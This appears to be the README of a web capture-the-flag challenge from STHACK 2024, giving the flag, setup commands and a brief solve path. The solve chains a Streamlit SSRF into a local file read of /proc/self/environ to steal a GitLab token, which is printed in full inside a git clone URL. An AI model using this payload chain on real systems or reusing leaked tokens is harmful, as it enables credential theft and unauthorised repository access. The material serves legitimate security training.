## Flag 🚩

STHACK{chain-your-bugz-tozemoonandback-ffs}

## Principe 💭

### Stream Is Lit Isnt It

> Unthread my plot, Chain your bugz, and Remember to Have Fun! ^_^

- Medium / Web / Linux
- Sources are given
    - Remove the `Detail` from the readme
    - Censor the `GIT_API_KEY` and `GIT_REPO_URL` in `docker compose.yml`
---

```bash
# Setup
docker compose down --remove-orphans --volumes ; docker compose up --build --remove-orphans -d

# Solve
# Open http://127.0.0.1/
# Submit http://backend_2:5000/?dump_me=/proc/self/environ
# Use token & git clone https://gitlab.com:glpat-4dQKhn3be6YmzmfzJbyx@gitlab.com/TheLaluka/totaly_safe_and_private_repo.git
# cd totaly_safe_and_private_repo && git diff 5eb01b7
# Flag: chain-your-bugz-tozemoonandback-ffs

# Logs
docker compose logs -f

# Night-Long Auto-Fix
echo '*/30 * * * * root bash -c "cd /opt/sthack-2024-challs/stream-is-lit-isnt-it ; docker compose down --remove-orphans --volumes ; docker compose up --build --remove-orphans -d"' | sudo tee -a /etc/crontab
```

## Configuration 🛠

1 host or VM with 2+ cores and ideally docker installed, only port 80 required

## Write-up 📝

- Abuse StreamLit for SSRF
- Abuse SSRF for Local File Read
- Read /proc/self/environ to get git api_key
- Reuse api_key to clone git repo
- Dig past commits to find the flag

Refer to `# Solve` for solvability check! :)

## Contact 📲

laluka
